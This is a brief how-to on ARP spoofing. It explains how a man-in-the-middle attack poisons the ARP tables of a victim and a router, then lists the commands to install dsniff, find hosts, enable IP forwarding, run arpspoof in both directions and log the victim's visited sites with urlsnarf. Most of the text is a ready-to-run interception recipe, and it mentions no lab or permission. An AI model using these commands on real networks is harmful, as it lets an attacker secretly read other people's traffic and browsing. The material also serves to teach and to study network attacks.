# ARP Spoofing

The first phase of ARP spoofing is to send the victim fake ARP responses by advertising the attacker's MAC address as the routers.

The victim updates the ARP table with the false information so the ARP table now reflects that the attacker's MAC address now maps to the routers IP address.

This allows the victims internet traffic to be sent to the attacker's machine rather than the router.

The attacker will then forward the packets to the router after inspection.

If the attacker also wants to intercept internet traffic intended for the victim, the attacker must also trick the router.

The attacker must create a fake ARP packet indicating that the victim’s IP address maps to the attacker’s MAC address.

This allows the at tacker to intercept and inspect incoming internet traffic and then forwards that traffic to the victim.



### Install dsniff

* `sudo -i`

* `apt-get update`

* `apt-get install dsniff`

### Discover endpoints on local network

* `sudo netdiscover`

### Enable port forwarding on attack box

* `echo 1 > /proc/sys/net/ipv4/ip_forward`

### Generate fake ARP replies to the victim. This disguises the attack box as the router.

* `sudo arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>`

### Generate fake ARP replies to trick the router into believing that you are the victim. This allows you to intercept incoming internet traffic.

* `sudo arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP>`

### Extract websites that the victim visits

* `urlsnarf -i eth0`
